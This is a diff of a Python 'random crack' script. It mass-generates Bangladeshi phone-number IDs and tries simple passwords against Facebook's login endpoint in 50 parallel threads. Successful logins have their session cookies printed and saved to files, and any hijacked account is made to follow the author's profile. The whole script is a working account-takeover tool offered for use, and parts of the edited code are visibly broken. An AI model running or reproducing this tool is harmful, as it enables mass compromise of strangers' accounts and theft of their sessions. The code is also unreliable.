@@ -1,5 +1,37 @@
-# Facebook: ASIF King
-# Github: ASIF-King
+import os
+import sys
+import time
+import requests
+import uuid
+os.system('git pull')
+os.system('pkg install curl')
+
+def o():
+    os.system('clear')
+    jalan(logo)
+    print('\033[1;32m─────────────────────────────────────────────────────────')
+    jalan('\033[1;95m[\033[1;93m1\033[1;95m]\033[1;96m RANDOM CRACK ')
+    jalan('\033[1;95m[\033[1;93m2\033[1;95m]\033[1;96m CONTACT ME FACEBOOK')
+    jalan('\033[1;95m[\033[1;93m3\033[1;95m]\033[1;96m FOLLOW You tub ')
+    jalan('\033[1;95m[\033[1;93m4\033[1;95m]\033[1;96m FOLLOW PAGE')
+    jalan('\033[1;95m[\033[1;93m0\033[1;95m]\033[1;91m EXIT')
+    opt = input('\n\x1b[1;32mCHOOSE : ')
+    if opt == '1':
+        i()
+    if None == '2':
+        os.system('xdg-open https://t.me/+7bbDYbK0DT8wMDBkL')
+        return None
+    if None == '3':
+        os.system('xdg-open https://t.me/+7bbDYbK0DT8wMDBkL')
+        return None
+    if None == '4':
+        os.system('xdg-open https://t.me/+7bbDYbK0DT8wMDBkL')
+        return None
+    if None == '0':
+        os.system('exit')
+        return None
+
+
 import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
 from bs4 import BeautifulSoup as sop
@@ -16,9 +48,13 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures bs4==2 > /dev/null')
-    os.system('pip install bs4')
-    
-#####APK#####
+    os.system('pip install bs4')    
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519i', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://free.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
             
             
  
@@ -29,26 +65,29 @@ class jalan:
             sys.stdout.flush()
             time.sleep(0.009)
             
-P = '\x1b[1;97m'
-M = '\x1b[1;91m'
-H = '\x1b[1;92m'
-K = '\x1b[1;93m'
-B = '\x1b[1;94m'
-U = '\x1b[1;95m' 
-O = '\x1b[1;96m'
-N = '\x1b[0m'    
-Z = "\033[1;30m"
-sir = '\033[41m\x1b[1;97m'
-x = '\33[m' # DEFAULT
-m = '\x1b[1;91m' #RED +
-k = '\033[93m' # KUNING +
-xr = '\x1b[1;92m' # HIJAU +
-hh = '\033[32m' # HIJAU -
-u = '\033[95m' # UNGU
-kk = '\033[33m' # KUNING -
-b = '\33[1;96m' # BIRU -
-p = '\x1b[0;34m' # BIRU +
-asu = random.choice([m,k,xr,u,b])
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' #
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+A = '\x1b[1;90m' # WARNA ABU ABU
+BN = '\x1b[1;107m' # BELAKANG PUTIH
+BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b[1;105m' # BELAKANG PINK
+BB = '\x1b[1;104m' # BELAKANG BIRU
+BK = '\x1b[1;103m' # BELAKANG KUNING
+BH = '\x1b[1;102m' # BELAKANG HIJAU
+BM = '\x1b[1;101m' # BELAJANG MERAH
+BA = '\x1b[1;100m' # BELAKANG ABU ABU
 my_color = [
  P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
@@ -59,25 +98,24 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-os.system('xdg-open https://facebook.com/groups/1365767507206612/')
-logo =(""" __   _______      _    ____ ___ _____ 
- \ \ / /_   _|    / \  / ___|_ _|  ___|
-  \ V /  | |     / _ \ \___ \| || |_   
-   | |   | |    / ___ \ ___) | ||  _|  
-   |_|   |_|   /_/   \_\____/___|_|    
-                                       
+logo = ("""
+\033[32;1m █████╗ \033[34;1m██████╗  \033[31;1m█████╗ \033[33;1m███████╗\033[35;1m █████╗ \033[31;1m████████╗ \033[1;93m
+\033[32;1m██╔══██╗\033[34;1m██╔══██╗\033[31;1m██╔══██╗\033[33;1m██╔════╝\033[35;1m██╔══██╗\033[31;1m╚══██╔══╝ \033[1;93m
+\033[32;1m███████║\033[34;1m██████╔╝\033[31;1m███████║\033[33;1m█████╗  \033[35;1m███████║   \033[31;1m██║   
+\033[32;1m██╔══██║\033[34;1m██╔══██╗\033[31;1m██╔══██║\033[33;1m██╔══╝  \033[35;1m██╔══██║   \033[31;1m██║   
+\033[32;1m██║  ██║██║  \033[34;1m██║██║  \033[31;1m██║██║     \033[33;1m██║  ██║   \033[35;1m██║   
+\033[32;1m╚═╝  ╚═╝╚═╝  \033[34;1m╚═╝╚═╝  \033[31;1m╚═╝╚═╝     \033[33;1m╚═╝  ╚═╝   \033[35;1m╚═╝   
+                                                 
+ \x1b[1;92m ╔═════════════╗  ࿇⃝🌹⃢𝘼⃢🌹⃝࿇  ╔══════════════════╗
+ \x1b[1;92m ║[🔵]𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢𝙍⃢🌹⃝࿇  ║𝘼𝙍𝘼𝙁𝘼𝙏            ║
+ \x1b[1;92m ║[🔵]𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢𝘼⃢🌹⃝࿇  ║𝐏𝐫𝐢𝐧𝐜𝐞𝐀𝐫𝐚𝐟𝐚𝐭770   ║
+ \x1b[1;92m ║[🔵]𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  ࿇⃝🌹⃢𝙁🌹⃝࿇  ║8801943520447     ║
+ \x1b[1;92m ║[🔵]𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢𝘼🌹⃝࿇  ║𝐏𝐑𝐈𝐍𝐂𝐄-𝐀𝐑𝐀𝐅𝐀𝐓     ║
+ \x1b[1;92m ║[🔵]𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢𝙏⃢🌹⃝࿇  ║8801943520447     ║
+ \x1b[1;92m ║[🔵]𝐈𝐌𝐎      ║  ࿇⃝🌹⃢4🌹⃝࿇  ║8801943520447     ║
+ \x1b[1;92m ║[🔵]𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢0⃢🌹⃝࿇  ║𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║
+ \x1b[1;92m ╚═════════════╝  ࿇⃝🌹⃢4🌹⃝࿇  ╚══════════════════╝  \n""")
 
- ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
- ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
- ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
- ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
- ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mASIF                       ┃
- ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+8801302**0111             ┃
- ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
- 
-  PLIZ FOLLOW MY GITHUB ACCOUNT
-  
-....................................................................................................................................""") 
 loop = 0
 oks = []
 cps = []
@@ -111,11 +149,11 @@ def dynamic(text):
     for o in titik:
         print('\r'+text+o),
         sys.stdout.flush();time.sleep(1)
- 
+
 #User agents
 ugen2=[]
 ugen=[]
- 
+
 for xd in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
@@ -131,54 +169,47 @@ for xd in range(10000):
     l='Mobile Safari/537.36'
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
-    
+
 # APK CHECK
-def xxr():
+def i():
     user=[]
     twf =[]
     os.getuid
     os.geteuid
     os.system("clear")
-    print(logo)
-    print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
-    print(" ══════════════════════════════════════════")
-    rk1 = '0171'
-    rk2 = '0172'
-    rk3 = '0175'
-    rk4 = '017'
-    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
+    jalan(logo)
+    jalan('\033[1;92m─────────────────────────────────────────────────────')
+    jalan('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;32mBD CODE    - \033[1;32m016 \033[1;32m017 \033[1;32m018 \033[1;32m019')
+    jalan('\033[1;92m─────────────────────────────────────────────────────\n')
+    code = input('\033[1;35m\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;32mCHOOSE YOUR COUNTRY CODE : ')
+    print("")
+    os.system('clear')
+    bal = input("ENTER YOUR NAME : ")
     os.system('clear')
     print(logo)
-    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+    limit = int(input('EXAMPLE: 3000, 5000, 15000, 20000\n\n\033[1;91m\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;32mCHOOSE CRACKING LIMIT : '))
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    os.system("clear")
-    print(logo)
-    passx = 0
-    HamiiID = []
-    print("")
-    for bilal in range(passx):
-        pww = input(f"[*] Enter Password {bilal+1} : ")
-        HamiiID.append(pww)
     with ThreadPool(max_workers=50) as manshera:
         clear()
         tl = str(len(user))
-        jalan('\033[1;97m====================================================')
-        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
-        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
-        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
-        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
-        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
-        jalan('\033[1;97m====================================================')
+        IP = requests.get('https://api.ipify.org').text
+        print(f"\033[1;91m[\033[1;92m✔︎\033[1;32m]{GREEN} TODAY DATE & TIME :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m USER\'S NAME : \033[1;92m'+bal)
+        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;32m'+code)
+        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m TOTAL IDS : \033[1;92m'+tl)
+        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m YOUR IP ADDRESS : \033[1;32m'+IP)
+        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m CRACKING HAS STARTED')
+        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m WORKS ON DATA AND WIFI')
+        print('\033[1;93m─────────────────────────────────────────────────────')
         for love in user:
-            pwx = [love[1:]]
+            pwx = [love, 'bangladesh','Bangladesh']
             uid = code+love
-            for Eman in HamiiID:
-                pwx.append(Eman)
-                pwx.append(love)
             manshera.submit(rcrack,uid,pwx,tl)
-    print(f"\n{x} ══════════════════════════════════════════")
+    print(' CRACK PROCESS HAS BEEN COMPLETED ')
+    print('IDS SAVED IN CYBER-505-OK.txt, CYBER-505-CP.txt')
+ 
 def rcrack(uid,pwx,tl):
     #print(user)
     global loop
@@ -189,59 +220,53 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
             "try_number":"0",
             "unrecognized_tries":"0",
             "email":uid,
+            "next":"https://web.facebook.com/login/device-based/regular/login/?refsrc",
+            "flow":"login_no_pain",
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.alpha.facebook.com',
-    'method': 'GET',
-    'scheme': 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36',}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            header_freefb = {"authority": 'free.facebook.com',
+            'method': 'GET',
+            'path':'https://free.facebook.com/?_rdc=1&_rdr',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Google Chrome";v="99", "Not)A;Brand";v="99", "Chromium";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?0',
+            'referer':'https://free.facebook.com/',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('\r\r\033[1;32m[ASIF-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                uid = coki[7:22]
+                print('\033[1;32𝐀𝐑𝐀𝐅𝐀𝐓-404-OK ]' +cid+ ' | ' +ps+'\033[0;35m')
+                print(f"{H}\033[0;35m[🍪]COOKIE :\033[1;32m{coki}")
                 cek_apk(session,coki)
-                open('/sdcard/ASIF-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                uid('/sdcard/𝐀𝐑𝐀𝐅𝐀𝐓-404-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                #print('\r\r\33[1;30m[ASIF-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
-                open('/sdcard/ASIF-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s{x}[{xr}ASIF{x}][%s\%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write('\r%s[𝐀𝐑𝐀𝐅𝐀𝐓-404] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
- 
-xxr()
- 
+
+o()
